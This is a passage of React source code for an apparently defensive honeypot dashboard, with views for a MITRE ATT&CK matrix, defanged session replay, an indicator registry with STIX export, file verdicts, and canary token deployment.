          <Chart height={188} option={{ tooltip: { trigger: "item", backgroundColor: "#101a2d", borderColor: "#273653", textStyle: { color: "#fff" } }, series: [{ type: "pie", radius: ["58%", "78%"], label: { show: false }, itemStyle: { borderColor: "#101a2b", borderWidth: 3 }, data: mitreTactics.slice(0, 5).map((item, index) => ({ name: item.name, value: ds.tactics[item.name]?.count || 0, itemStyle: { color: [COLORS.cyan, COLORS.blue, COLORS.purple, COLORS.red, COLORS.orange][index] } })) }], graphic: [{ type: "text", left: "center", top: "42%", style: { text: String(ds.mappings), fill: "#f3f7ff", font: "700 22px Inter" } }, { type: "text", left: "center", top: "56%", style: { text: "MAPPINGS", fill: "#7183a3", font: "9px Inter" } }] }} />
        </Panel>
      </div>
      <Panel className="mitre-matrix" title="MITRE ATT&CK framework" eyebrow="Technique density by tactic" action={<div className="matrix-actions"><label className="search-field compact"><IconSearch size={14} /><input value={query} onChange={(event) => setQuery(event.target.value)} placeholder="Search technique" /></label><button className="ghost-button"><IconFilter size={15} />Filters</button></div>}>
        <div className="matrix-scroll">
          <div className="matrix-grid">
            {visible.map((tactic) => {
              const originalTacticIndex = mitreTactics.findIndex((t) => t.name === tactic.name);
              const isTacticMatch = queryStr ? tactic.name.toLowerCase() === queryStr : false;
              const tacticCount = ds.tactics[tactic.name]?.count || 0;
              return (
                <div className="tactic-column" key={tactic.name}>
                  <button className={`tactic-head tactic-${originalTacticIndex % 6}`} onClick={() => setActiveTactic(activeTactic === tactic.name ? null : tactic.name)}><span>{tactic.name}</span><strong>{tacticCount}</strong><small>{tactic.techniques.length} techniques</small></button>
                  {tactic.techniques.map((technique, techniqueIndex) => {
                    const details = getTechniqueDetails(technique, tactic.name, originalTacticIndex, techniqueIndex);
                    const eventsCount = ds.tactics[tactic.name]?.[details.id] || 0;
                    const intel = getMitreIntelligence(technique, tactic.name, originalTacticIndex, techniqueIndex);

                    const isMatch = queryStr ? (
                      isTacticMatch ||
                      matchesQuery(technique, queryStr) ||
                      matchesQuery(details.id, queryStr) ||
                      details.subIds.some(subId => matchesQuery(subId, queryStr)) ||
                      details.subNames.some(subName => matchesQuery(subName, queryStr))
                    ) : false;

                    const cardClass = `technique heat-${(tacticCount + techniqueIndex) % 4}${queryStr ? (isMatch ? " highlighted" : " dimmed") : ""}`;

                    return (
                      <button className={cardClass} key={technique} onClick={() => {
                        onSelectMitre({
                          id: intel.id,
                          name: technique,
                          severity: intel.severity,
                          description: intel.description,
                          evidence: intel.evidence,
                          sensors: intel.sensors,
                          attempts: eventsCount
                        });
                      }}>
                        <strong>{technique}</strong>
                        <span>{details.id}</span>
                        <i>{eventsCount} events</i>
                      </button>
                    );
                  })}
                </div>
              );
            })}
          </div>
        </div>
        <footer className="matrix-footer"><span><i className="heat-dot low" />Low</span><span><i className="heat-dot medium" />Medium</span><span><i className="heat-dot high" />High</span><span><i className="heat-dot critical" />Critical</span><small>{activeTactic ? `Filtered to ${activeTactic}` : "Click a tactic header to isolate it"}</small></footer>
      </Panel>
    </>
  );
}

function SessionsView({ sessionsList, selectedSessionId, onSelectSession }) {
  const currentSessions = sessionsList && sessionsList.length > 0 ? sessionsList : sessions;

  const initialSelected = useMemo(() => {
    if (selectedSessionId) {
      const match = currentSessions.find((s) => s.id === selectedSessionId);
      if (match) return match;
    }
    return currentSessions[0];
  }, [selectedSessionId, currentSessions]);

  const [selected, setSelected] = useState(initialSelected);

  useEffect(() => {
    if (selectedSessionId) {
      const match = currentSessions.find((s) => s.id === selectedSessionId);
      if (match) setSelected(match);
    }
  }, [selectedSessionId, currentSessions]);

  const displayCommands = useMemo(() => {
    const list = selected?.commands || [];
    const filtered = list.filter((c) => isRealCliCommand(c.input));
    return filtered.length > 0 ? filtered : list;
  }, [selected]);

  const [playing, setPlaying] = useState(false);
  const [cursor, setCursor] = useState(1);
  const [query, setQuery] = useState("");

  useEffect(() => {
    if (!playing) return undefined;
    const timer = window.setInterval(() => setCursor((current) => (current >= (displayCommands.length || 1) ? 1 : current + 1)), 1300);
    return () => window.clearInterval(timer);
  }, [playing, displayCommands]);

  useEffect(() => {
    setCursor(displayCommands.length || 1);
    setPlaying(false);
  }, [selected, displayCommands]);

  const filtered = currentSessions.filter((item) => `${item.id} ${item.sourceIp} ${item.country} ${item.sensor} ${item.intent || ""}`.toLowerCase().includes(query.toLowerCase()));

  const handleSelect = (item) => {
    setSelected(item);
    if (onSelectSession) onSelectSession(item.id);
  };

  return (
    <div className="session-layout">
      <Panel className="session-list" title="Captured sessions" eyebrow={`${currentSessions.length} captures`} action={<label className="search-field compact"><IconSearch size={14} /><input value={query} onChange={(event) => setQuery(event.target.value)} placeholder="Search" /></label>}>
        <div className="session-items">
          {filtered.map((item) => (
            <button className={selected?.id === item.id ? "active" : ""} key={item.id} onClick={() => handleSelect(item)}>
              <span><Severity value={item.severity || "High"} /><strong>{item.sourceIp}</strong><Status value={item.status || "Closed"} /></span>
              <small>{item.id} · {item.country}</small>
              <div><span>{item.protocol} · {item.sensor}</span><time>{formatDuration(item.duration || 120)}</time></div>
            </button>
          ))}
        </div>
      </Panel>
      <div className="replay-stack">
        <Panel className="replay-panel" title={`Session replay · ${selected?.id || ""}`} eyebrow="Sanitized, non-executable evidence" action={<Status value={selected?.status || "Captured"} />}>
          <div className="replay-meta">
            <span><IconWorld size={15} />{selected?.sourceIp} · {selected?.country}</span>
            <span><IconServer2 size={15} />{selected?.sensor}</span>
            <span><IconClock size={15} />{formatDuration(selected?.duration || 120)}</span>
            <span><IconTerminal2 size={15} />{displayCommands.length} inputs</span>
          </div>
          <div className="terminal-window">
            <div className="terminal-head"><span><i /><i /><i /></span><small>isolated replay · input is text only</small><IconLock size={14} /></div>
            <div className="terminal-body">
              <p className="terminal-notice"># Captured commands are escaped and defanged. Nothing in this viewer is executed.</p>
              {displayCommands.slice(0, cursor).map((command, index) => (
                <div className="terminal-line" key={`${selected?.id}-${index}`}>
                  <time>+{String(command.at || 5).padStart(3, "0")}s</time>
                  <p><span>decoy@deception:~$</span> {command.input}</p>
                  <small>{command.output}</small>
                </div>
              ))}
            </div>
          </div>
          <div className="replay-controls">
            <button className="play-button" aria-label={playing ? "Pause replay" : "Play replay"} onClick={() => setPlaying(!playing)}>
              {playing ? <IconPlayerPause size={17} /> : <IconPlayerPlay size={17} />}
            </button>
            <span>{displayCommands[Math.max(0, cursor - 1)]?.at ?? 0}s</span>
            <input aria-label="Replay position" type="range" min="1" max={displayCommands.length || 1} value={cursor} onChange={(event) => { setCursor(Number(event.target.value)); setPlaying(false); }} />
            <span>{displayCommands.at(-1)?.at || 5}s</span>
            <button className="icon-button" onClick={() => setCursor(1)} title="Restart replay" aria-label="Restart replay">
              <IconRefresh size={15} />
            </button>
          </div>
        </Panel>
        <div className="session-evidence-grid">
          <Panel title="Observed intent" eyebrow="Heuristic summary">
            <ul className="evidence-list">
              <li><IconSearch size={16} />{selected?.intent || "System discovery & reconnaissance"}</li>
              <li><IconKey size={16} />Credential access attempt</li>
              <li><IconCloudLock size={16} />Defanged download intent</li>
              <li><IconShieldCheck size={16} />Contained in decoy VLAN</li>
            </ul>
          </Panel>
          <Panel title="Session trail" eyebrow="Correlated sequence">
            <div className="trail">
              <span><i />Connection accepted<small>+00s</small></span>
              <span><i />Credential lure touched<small>+18s</small></span>
              <span><i />Command intent captured<small>+36s</small></span>
              <span><i />Session closed<small>+74s</small></span>
            </div>
          </Panel>
        </div>
      </div>
    </div>
  );
}

function IocsView() {
  const [type, setType] = useState("All types");
  const [query, setQuery] = useState("");
  const [page, setPage] = useState(1);
  const pageSize = 10;

  const [list, setList] = useState(() => indicators.map((ioc) => ({
    ...ioc,
    state: ioc.state === "Blocked" ? "Flagged" : ioc.state === "Watching" ? "Tracked" : ioc.state
  })));
  const [toast, setToast] = useState("");
  const triggerToast = (msg) => {
    setToast(msg);
    setTimeout(() => setToast(""), 3000);
  };

  const [isModalOpen, setIsModalOpen] = useState(false);
  const [newType, setNewType] = useState("IPv4");
  const [newValue, setNewValue] = useState("");
  const [newSource, setNewSource] = useState("Manual Analyst Entry");
  const [newConfidence, setNewConfidence] = useState(90);
  const [newState, setNewState] = useState("Flagged");

  const stats = useMemo(() => {
    const active = list.length;
    const highConf = list.filter(ioc => ioc.confidence >= 75).length;
    const sightings = list.reduce((acc, ioc) => acc + ioc.sightings, 0);
    const autoBlocked = list.filter(ioc => ioc.state === "Flagged" || ioc.state === "Blocked").length;
    return { active, highConf, sightings, autoBlocked };
  }, [list]);

  const filtered = useMemo(() => {
    return list.filter((ioc) =>
      (type === "All types" || ioc.type === type) &&
      `${ioc.value} ${ioc.source} ${ioc.tags.join(" ")}`.toLowerCase().includes(query.toLowerCase())
    );
  }, [list, type, query]);

  const totalPages = Math.ceil(filtered.length / pageSize) || 1;

  useEffect(() => {
    if (page > totalPages) {
      setPage(totalPages);
    }
  }, [filtered.length, totalPages, page]);

  const pageItems = useMemo(() => {
    return filtered.slice((page - 1) * pageSize, page * pageSize);
  }, [filtered, page]);

  const uuidv4 = () => {
    return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
      const r = (Math.random() * 16) | 0;
      const v = c === "x" ? r : (r & 0x3) | 0x8;
      return v.toString(16);
    });
  };

  const handleExportStix = () => {
    const objects = filtered.map((ioc) => {
      let pattern = "";
      if (ioc.type === "IPv4") {
        pattern = `[ipv4-addr:value = '${ioc.value}']`;
      } else if (ioc.type === "Domain") {
        pattern = `[domain-name:value = '${ioc.value}']`;
      } else if (ioc.type === "URL") {
        pattern = `[url:value = '${ioc.value}']`;
      } else if (ioc.type === "SHA-256") {
        pattern = `[file:hashes.'SHA-256' = '${ioc.value}']`;
      }
      return {
        type: "indicator",
        id: `indicator--${uuidv4()}`,
        created: ioc.firstSeen,
        modified: ioc.firstSeen,
        pattern_type: "stix",
        pattern: pattern,
        valid_from: ioc.firstSeen,
        confidence: ioc.confidence,
        indicator_types: ["malicious-activity"],
        name: `${ioc.type} Threat Indicator`,
        description: `Indicator registry export: ${ioc.id}`
      };
    });

    const bundle = {
      type: "bundle",
      id: `bundle--${uuidv4()}`,
      objects: objects
    };

    const jsonString = JSON.stringify(bundle, null, 2);
    const blob = new Blob([jsonString], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = "stix_threat_indicators.json";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);

    triggerToast("STIX 2.1 Bundle exported successfully");
  };

  const handleSave = (e) => {
    e.preventDefault();
    if (!newValue.trim()) return;

    const ids = list.map(ioc => parseInt(ioc.id.replace("IOC-", "")) || 76000);
    const nextIdVal = Math.max(...ids) + 1;
    const newId = `IOC-${nextIdVal}`;

    const newIoc = {
      id: newId,
      type: newType,
      value: newValue.trim(),
      confidence: newConfidence,
      sightings: 1,
      firstSeen: new Date().toISOString(),
      source: newSource.trim() || "Manual Analyst Entry",
      state: newState,
      tags: ["Incident Response", "manual"]
    };

    setList(prev => [newIoc, ...prev]);
    setIsModalOpen(false);

    setNewValue("");
    setNewSource("Manual Analyst Entry");
    setNewConfidence(90);
    setNewState("Flagged");

    triggerToast(`Indicator ${newId} created successfully`);
  };

  return (
    <>
      <div className="metrics-grid four slim">
        <MetricCard label="Active indicators" value={String(stats.active)} delta="12 new" trend={[101, 108, 113, 121, 126, 132, stats.active]} />
        <MetricCard label="High confidence" value={String(stats.highConf)} delta="60.4%" accent={COLORS.red} trend={[49, 55, 61, 68, 71, 80, stats.highConf]} />
        <MetricCard label="Sightings today" value={stats.sightings.toLocaleString()} delta="21.4%" accent={COLORS.purple} trend={[31, 39, 47, 50, 61, 72, 88]} />
        <MetricCard label="Auto-blocked" value={String(stats.autoBlocked)} delta="89.6%" accent={COLORS.green} trend={[90, 96, 104, 112, 118, 123, stats.autoBlocked]} />
      </div>

      <div className="page-actions">
        <div className="tab-switch">
          {["All types", "IPv4", "Domain", "URL", "SHA-256"].map((t) => {
            const count = t === "All types"
              ? list.length
              : list.filter(ioc => ioc.type === t).length;
            return (
              <button
                key={t}
                className={type === t ? "active" : ""}
                onClick={() => { setType(t); setPage(1); }}
              >
                {t} <span>{count}</span>
              </button>
            );
          })}
        </div>
      </div>

      <Panel className="table-panel" title="Indicator registry" eyebrow={`Showing ${filtered.length} items`} action={<button className="primary-button" onClick={() => setIsModalOpen(true)}><IconSparkles size={16} />Create indicator</button>}>
        <div className="filter-bar">
          <label className="search-field">
            <IconSearch size={16} />
            <input value={query} onChange={(event) => { setQuery(event.target.value); setPage(1); }} placeholder="Search indicator, source, or tag…" />
          </label>
          <button className="ghost-button" onClick={handleExportStix}><IconExternalLink size={15} />Export STIX</button>
        </div>
        <div className="table-scroll">
          <table>
            <thead>
              <tr>
                <th>Type</th>
                <th>Indicator</th>
                <th>Confidence</th>
                <th>Sightings</th>
                <th>Source</th>
                <th>State</th>
                <th>First seen</th>
              </tr>
            </thead>
            <tbody>
              {pageItems.map((ioc) => (
                <tr key={ioc.id}>
                  <td><span className="type-chip">{ioc.type}</span></td>
                  <td><code className="long-code">{ioc.value}</code><small>{ioc.id}</small></td>
                  <td>
                    <div className="confidence">
                      <div><i style={{ width: `${ioc.confidence}%` }} /></div>
                      <strong>{ioc.confidence}%</strong>
                    </div>
                  </td>
                  <td>{ioc.sightings}</td>
                  <td>{ioc.source}</td>
                  <td><Status value={ioc.state} /></td>
                  <td>{formatTimestamp(ioc.firstSeen)}</td>
                </tr>
              ))}
            </tbody>
          </table>
          {!filtered.length && <TableEmpty />}
        </div>
        <footer className="table-footer">
          <span>Showing {filtered.length ? (page - 1) * pageSize + 1 : 0}-{Math.min(page * pageSize, filtered.length)} of {filtered.length} matching indicators</span>
          <div>
            <button disabled={page === 1} onClick={() => setPage(page - 1)} aria-label="Previous page">
              <IconChevronLeft size={14} />
            </button>
            {Array.from({ length: totalPages }, (_, idx) => idx + 1).map((p) => (
              <button key={p} className={page === p ? "active" : ""} onClick={() => setPage(p)} aria-label={`Page ${p}`}>
                {p}
              </button>
            ))}
            <button disabled={page === totalPages} onClick={() => setPage(page + 1)} aria-label="Next page">
              <IconChevronRight size={14} />
            </button>
          </div>
        </footer>
      </Panel>

      {isModalOpen && (
        <div className="modal-overlay">
          <div className="modal-content">
            <div className="modal-header">
              <h2><IconSparkles size={18} /> Create Indicator</h2>
              <button onClick={() => setIsModalOpen(false)}><IconX size={18} /></button>
            </div>
            <form onSubmit={handleSave}>
              <div className="form-group">
                <label>Type</label>
                <select value={newType} onChange={(e) => {
                  setNewType(e.target.value);
                  setNewValue("");
                }}>
                  <option value="IPv4">IPv4</option>
                  <option value="Domain">Domain</option>
                  <option value="URL">URL</option>
                  <option value="SHA-256">SHA-256</option>
                </select>
              </div>
              <div className="form-group">
                <label>Indicator Value</label>
                <input
                  type="text"
                  required
                  value={newValue}
                  onChange={(e) => setNewValue(e.target.value)}
                  placeholder={
                    newType === "IPv4" ? "e.g. 185.220.101.5 (defanged: 185.220.101[.]5)" :
                      newType === "Domain" ? "e.g. malware.example.com (defanged: malware.example[.]com)" :
                        newType === "URL" ? "hxxps[:]//malware.example[.]com/payload" :
                          "e.g. 64-char SHA-256 hex hash"
                  }
                />
              </div>
              <div className="form-group">
                <label>Source</label>
                <input
                  type="text"
                  value={newSource}
                  onChange={(e) => setNewSource(e.target.value)}
                />
              </div>
              <div className="form-group">
                <label>Confidence Score: {newConfidence}%</label>
                <input
                  type="range"
                  min="0"
                  max="100"
                  value={newConfidence}
                  onChange={(e) => setNewConfidence(Number(e.target.value))}
                />
              </div>
              <div className="form-group">
                <label>State</label>
                <select value={newState} onChange={(e) => setNewState(e.target.value)}>
                  <option value="Flagged">Flagged</option>
                  <option value="Tracked">Tracked</option>
                </select>
              </div>
              <div className="modal-actions">
                <button type="button" className="ghost-button" onClick={() => setIsModalOpen(false)}>Cancel</button>
                <button type="submit" className="primary-button">Save Indicator</button>
              </div>
            </form>
          </div>
        </div>
      )}

      {toast && (
        <div className="toast-notification">
          <IconShieldCheck size={16} style={{ color: COLORS.green }} />
          <span>{toast}</span>
        </div>
      )}
    </>
  );
}

function FilesView() {
  const [selected, setSelected] = useState(files[0]);
  const [verdict, setVerdict] = useState("All verdicts");
  const visible = files.filter((file) => verdict === "All verdicts" || file.verdict === verdict);
  return (
    <>
      <div className="files-layout">
        <Panel className="table-panel files-table" title="Submitted files" eyebrow={`${files.length} isolated records`} action={<label className="select-field compact"><IconFilter size={14} /><select value={verdict} onChange={(event) => setVerdict(event.target.value)}>{["All verdicts", "Malicious", "Suspicious", "Clean simulation"].map((item) => <option key={item}>{item}</option>)}</select><IconChevronDown size={13} /></label>}>
          <div className="table-scroll"><table><thead><tr><th>File</th><th>Verdict</th><th>Engines</th><th>Size</th><th>Submitted</th></tr></thead><tbody>{visible.slice(0, 60).map((file) => <tr className={selected.id === file.id ? "selected" : ""} onClick={() => setSelected(file)} key={file.id}><td><span className="file-name"><IconFileCode size={16} /><span><strong>{file.name}</strong><small>{file.id}</small></span></span></td><td><Status value={file.verdict} /></td><td>{file.engines}</td><td>{file.size}</td><td>{formatTimestamp(file.submitted)}</td></tr>)}</tbody></table></div>
        </Panel>
        <Panel className="file-detail" title="Analysis record" eyebrow={selected.id} action={<a className="icon-button" href={`https://www.virustotal.com/gui/file/${selected.sha256}`} target="_blank" rel="noopener noreferrer" aria-label="Open analysis record"><IconExternalLink size={15} /></a>}>
          <div className="file-hero"><span className={`file-verdict ${selected.verdict.toLowerCase().split(" ")[0]}`}><IconBug size={25} /></span><strong>{selected.name}</strong><Status value={selected.verdict} /></div>
          <dl className="detail-list"><div><dt>SHA-256</dt><dd><code>{selected.sha256}</code></dd></div><div><dt>Detection engines</dt><dd>{selected.engines}</dd></div><div><dt>Pipeline</dt><dd>{selected.sandbox}</dd></div><div><dt>Size</dt><dd>{selected.size}</dd></div></dl>
          <h3>Observed behavior labels</h3><div className="tag-list">{selected.behavior.map((item) => <span key={item}>{item}</span>)}</div>
        </Panel>
      </div>
    </>
  );
}

function CanaryView() {
  const [list, setList] = useState(canaries);
  const [query, setQuery] = useState("");
  const [selectedCanary, setSelectedCanary] = useState(null);

  const [isModalOpen, setIsModalOpen] = useState(false);
  const [tokenName, setTokenName] = useState("");
  const [tokenType, setTokenType] = useState("Document Lure");
  const [decoySensor, setDecoySensor] = useState("Document Lure");
  const [pathPreset, setPathPreset] = useState("/srv/shares/finance/docs/");
  const [customPath, setCustomPath] = useState("");
  const [toast, setToast] = useState("");

  const [isEditModalOpen, setIsEditModalOpen] = useState(false);
  const [editName, setEditName] = useState("");
  const [editType, setEditType] = useState("");
  const [editSensor, setEditSensor] = useState("");
  const [editPath, setEditPath] = useState("");
  const [editState, setEditState] = useState("");

  const triggerToast = (msg) => {
    setToast(msg);
    setTimeout(() => setToast(""), 3000);
  };

  const handleStartEdit = () => {
    setEditName(selectedCanary.name);
    setEditType(selectedCanary.kind);
    setEditSensor(selectedCanary.sensor);
    setEditPath(selectedCanary.deploymentPath || "");
    setEditState(selectedCanary.state);
    setIsEditModalOpen(true);
  };

  const handleSaveEdit = (e) => {
    e.preventDefault();
    const updatedList = list.map((item) => {
      if (item.id === selectedCanary.id) {
        return {
          ...item,
          name: editName,
          kind: editType,
          sensor: editSensor,
          deploymentPath: editPath,
          state: editState
        };
      }
      return item;
    });
    setList(updatedList);
    setSelectedCanary({
      ...selectedCanary,
      name: editName,
      kind: editType,
      sensor: editSensor,
      deploymentPath: editPath,
      state: editState
    });
    setIsEditModalOpen(false);
    triggerToast("Canary token updated successfully");
  };

  const handleDeploy = (e) => {
    e.preventDefault();
    const newId = `CNY-${8000 + list.length}`;
    const finalPath = pathPreset === "custom" ? customPath : pathPreset;
    const newCanary = {
      id: newId,
      name: tokenName || "unnamed_token",
      kind: tokenType,
      sensor: decoySensor,
      state: "Armed",
      lastSignal: "Just deployed",
      owner: "SOC Operations",
      deploymentPath: finalPath
    };
    setList([newCanary, ...list]);
    setIsModalOpen(false);
    setTokenName("");
    setCustomPath("");
    triggerToast("Canary token deployed successfully to selected path");
  };

  const visible = list.filter((item) =>
    `${item.name} ${item.kind} ${item.sensor}`.toLowerCase().includes(query.toLowerCase())
  );

  return (
    <>
      <div className="metrics-grid four slim">
        <MetricCard
          label="Armed tokens"
          value="5"
          delta="Healthy"
          accent={COLORS.green}
          trend={[4, 5, 4, 6, 5, 5, 5]}
          interactiveSparkline={true}
          strokeColor="#10b981"
          fillColor="rgba(16, 185, 129, 0.1)"
        />
        <MetricCard
          label="Triggered"
          value="2"
          delta={<span className="badge-pulse"><span className="pulse-dot" />CRITICAL</span>}
          positive={false}
          accent={COLORS.red}
          trend={[1, 2, 1, 3, 2, 1, 2]}
          interactiveSparkline={true}
          strokeColor="#ef4444"
          fillColor="rgba(239, 68, 68, 0.15)"
        />
        <MetricCard
          label="Needs review"
          value="2"
          delta={<span className="badge-warning-orange">WARNING</span>}
          positive={false}
          accent={COLORS.orange}
          trend={[3, 2, 4, 2, 3, 1, 2]}
          interactiveSparkline={true}
          strokeColor="#f59e0b"
          fillColor="rgba(245, 158, 11, 0.1)"
        />
        <MetricCard
          label="Median signal"
          value="480ms"
          delta="Optimal"
          positive={true}
          accent={COLORS.blue}
          trend={[61, 56, 52, 53, 49, 47, 48]}
          interactiveSparkline={true}
          strokeColor="#3b82f6"
          fillColor="rgba(59, 130, 246, 0.1)"
        />
      </div>
      <Panel
        title="Canary deployment mesh"
        eyebrow="Local deception inventory"
        action={
          <div className="canary-actions">
            <label className="search-field compact">
              <IconSearch size={14} />
              <input
                value={query}
                onChange={(e) => setQuery(e.target.value)}
                placeholder="Search token"
              />
            </label>
            <button className="primary-button" onClick={() => setIsModalOpen(true)}>
              <IconRadar size={15} />New canary
            </button>
          </div>
        }
      >
        <div className="canary-grid">
          {visible.map((item) => (
            <article
              key={item.id}
              className={`canary-card state-${item.state.toLowerCase().replaceAll(" ", "-")}`}
              onClick={() => setSelectedCanary(item)}
            >
              <header>
                <span><IconRadar size={17} /></span>
                <Status value={item.state} />
              </header>
              <strong>{item.name}</strong>
              <small>{item.id} · {item.kind}</small>
              <dl>
                <div>
                  <dt>Sensor</dt>
                  <dd>{item.sensor}</dd>
                </div>
                <div>
                  <dt>Last signal</dt>
                  <dd>{item.lastSignal}</dd>
                </div>
              </dl>
              <footer>
                <span>{item.owner}</span>
                <button aria-label={`Open ${item.name}`}><IconChevronRight size={15} /></button>
              </footer>
            </article>
          ))}
        </div>
      </Panel>

      {isModalOpen && (
        <div className="modal-overlay">
          <div className="modal-content">
            <h2>Deploy New Deception Token</h2>
            <form onSubmit={handleDeploy}>
              <div className="form-group">
                <label>Token Name & ID</label>
                <input
                  type="text"
                  value={tokenName}
                  onChange={(e) => setTokenName(e.target.value)}
                  placeholder="e.g. confidential_q4_results.docx"
                  required
                />
              </div>
              <div className="form-group">
                <label>Token Type</label>
                <select value={tokenType} onChange={(e) => setTokenType(e.target.value)}>
                  <option value="Document Lure">Document Lure</option>
                  <option value="SSH Key">SSH Key</option>
                  <option value="AWS Access Key">AWS Access Key</option>
                  <option value="Database Connection String">Database Connection String</option>
                  <option value="API Secret">API Secret</option>
                  <option value="K8s Certificate">K8s Certificate</option>
                </select>
              </div>
              <div className="form-group">
                <label>Target Sensor Environment</label>
                <select value={decoySensor} onChange={(e) => setDecoySensor(e.target.value)}>
                  <option value="API Sentinel">API Sentinel</option>
                  <option value="Linux Bastion Decoy">Linux Bastion Decoy</option>
                  <option value="RDP Trap">RDP Trap</option>
                  <option value="Web Decoy">Web Decoy</option>
                  <option value="DNS Sinkhole">DNS Sinkhole</option>
                </select>
              </div>
              <div className="form-group">
                <label>Deployment Path / Folder Location</label>
                <select value={pathPreset} onChange={(e) => {
                  setPathPreset(e.target.value);
                  if (e.target.value !== "custom") {
                    setCustomPath("");
                  }
                }}>
                  <option value="/srv/shares/finance/docs/">/srv/shares/finance/docs/ (Financial Document Lures)</option>
                  <option value="/home/admin/.ssh/">/home/admin/.ssh/ (SSH Credentials)</option>
                  <option value="/var/www/html/config/">/var/www/html/config/ (Web Application Secrets)</option>
                  <option value="/opt/vault/secrets/">/opt/vault/secrets/ (API & Cloud Keys)</option>
                  <option value="custom">Custom Path...</option>
                </select>
              </div>
              {pathPreset === "custom" && (
                <div className="form-group">
                  <label>Custom Folder Location</label>
                  <input
                    type="text"
                    value={customPath}
                    onChange={(e) => setCustomPath(e.target.value)}
                    placeholder="e.g. /etc/security/keys/"
                    required
                  />
                </div>
              )}
              <div className="modal-actions">
                <button type="button" className="secondary-button" onClick={() => setIsModalOpen(false)}>Cancel</button>
                <button type="submit" className="primary-button">Deploy Canary Token</button>
              </div>
            </form>
          </div>
        </div>
      )}

      {isEditModalOpen && (
        <div className="modal-overlay">
          <div className="modal-content">
            <h2>Edit Canary Deception Token</h2>
            <form onSubmit={handleSaveEdit}>
              <div className="form-group">
                <label>Token Name & ID</label>
                <input
                  type="text"
                  value={editName}
                  onChange={(e) => setEditName(e.target.value)}
                  required
                />
              </div>
              <div className="form-group">
                <label>Token Type</label>
                <select value={editType} onChange={(e) => setEditType(e.target.value)}>
                  <option value="AWS IAM Access Key — Cloud Admin Lure">AWS IAM Access Key — Cloud Admin Lure</option>
                  <option value="PostgreSQL Production Connection String">PostgreSQL Production Connection String</option>
                  <option value="Word Webhook Beacon — HR Sensitive Doc">Word Webhook Beacon — HR Sensitive Doc</option>
                  <option value="Kubernetes Production Admin Token">Kubernetes Production Admin Token</option>
                  <option value="Internal SSO Authentication Sinkhole">Internal SSO Authentication Sinkhole</option>
                  <option value="OpenSSH Private Key — Bastion Host Root">OpenSSH Private Key — Bastion Host Root</option>
                  <option value="Slack Enterprise OAuth Token">Slack Enterprise OAuth Token</option>
                  <option value="HashiCorp Vault Master Root Secret">HashiCorp Vault Master Root Secret</option>
                  <option value="C-Level OpenVPN Client Certificate">C-Level OpenVPN Client Certificate</option>
                  <option value="Other / Custom Lure Type">Other / Custom Lure Type</option>
                </select>
              </div>
              <div className="form-group">
                <label>Target Sensor Environment</label>
                <select value={editSensor} onChange={(e) => setEditSensor(e.target.value)}>
                  <option value="API Sentinel">API Sentinel</option>
                  <option value="Linux Bastion Decoy">Linux Bastion Decoy</option>
                  <option value="RDP Trap">RDP Trap</option>
                  <option value="Web Decoy">Web Decoy</option>
                  <option value="DNS Sinkhole">DNS Sinkhole</option>
                  <option value="K8s Honeypot">K8s Honeypot</option>
                  <option value="API Gateway Trap">API Gateway Trap</option>
                  <option value="Network Boundary Decoy">Network Boundary Decoy</option>
                </select>
              </div>
              <div className="form-group">
                <label>Deployment Path / Folder Location</label>
                <input
                  type="text"
                  value={editPath}
                  onChange={(e) => setEditPath(e.target.value)}
                  required
                />
              </div>
              <div className="form-group">
                <label>Token Status</label>
                <select value={editState} onChange={(e) => setEditState(e.target.value)}>
                  <option value="Armed">Armed</option>
                  <option value="Triggered">Triggered</option>
                  <option value="Needs review">Needs review</option>
                </select>
              </div>
              <div className="modal-actions">
                <button type="button" className="secondary-button" onClick={() => setIsEditModalOpen(false)}>Cancel</button>
                <button type="submit" className="primary-button">Save Changes</button>
              </div>
            </form>
          </div>
        </div>
      )}

      {selectedCanary && (
        <div className="drawer-backdrop" onMouseDown={(e) => e.target === e.currentTarget && setSelectedCanary(null)}>
          <aside className="event-drawer" role="dialog" aria-modal="true" aria-label="Canary Token Details">
            <header>
              <div>
                <span className="eyebrow">{selectedCanary.id}</span>
                <h2>Canary Token Details</h2>
              </div>
              <button className="icon-button" onClick={() => setSelectedCanary(null)} aria-label="Close details">
                <IconX size={18} />
              </button>
            </header>

            <div className="drawer-summary">
              <span className={`file-verdict ${selectedCanary.state.toLowerCase()}`} style={{ marginRight: '8px', background: 'transparent' }}>
                <IconRadar size={18} />
              </span>
              <strong>{selectedCanary.name}</strong>
              <Status value={selectedCanary.state} />
            </div>

            <section>
              <h3>Asset Details</h3>
              <dl className="detail-list" style={{ padding: '0 12px' }}>
                <div>
                  <dt>Token Type / Asset</dt>
                  <dd>{selectedCanary.kind}</dd>
                </div>
                <div>
                  <dt>Deployment Path / Target</dt>
                  <dd><code>{selectedCanary.name}</code></dd>
                </div>
                {selectedCanary.deploymentPath && (
                  <div>
                    <dt>Deployment Location</dt>
                    <dd><code>{selectedCanary.deploymentPath}</code></dd>
                  </div>
                )}
                <div>
                  <dt>Sensor Origin</dt>
                  <dd>{selectedCanary.sensor}</dd>
                </div>
                <div>
                  <dt>Owner Group</dt>
                  <dd>{selectedCanary.owner}</dd>
                </div>
                <div>
                  <dt>Last Signal</dt>
                  <dd>{selectedCanary.lastSignal}</dd>
                </div>
              </dl>
            </section>

            {selectedCanary.state === "Triggered" && (
              <section>
                <h3>Trigger Telemetry</h3>
                <dl className="detail-list" style={{ padding: '0 12px' }}>
                  <div>
                    <dt>Source IP</dt>
                    <dd><code>185.220.101.5</code></dd>
                  </div>
                  <div>
                    <dt>User-Agent</dt>
                    <dd style={{ fontSize: '7.5px' }}>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</dd>
                  </div>
                  <div>
                    <dt>Trigger Timestamp</dt>
                    <dd>{new Date().toISOString()}</dd>
                  </div>
                </dl>
              </section>
            )}

            <footer>
              <div style={{ display: 'flex', gap: '8px', width: '100%' }}>
                <button
                  className="edit-token-button"
                  onClick={handleStartEdit}
                >
                  <IconPencil size={15} /> Edit Token
                </button>
                <button
                  className="destructive-outline-button"
                  onClick={() => {
                    const updated = list.filter(c => c.id !== selectedCanary.id);
                    setList(updated);
                    setSelectedCanary(null);
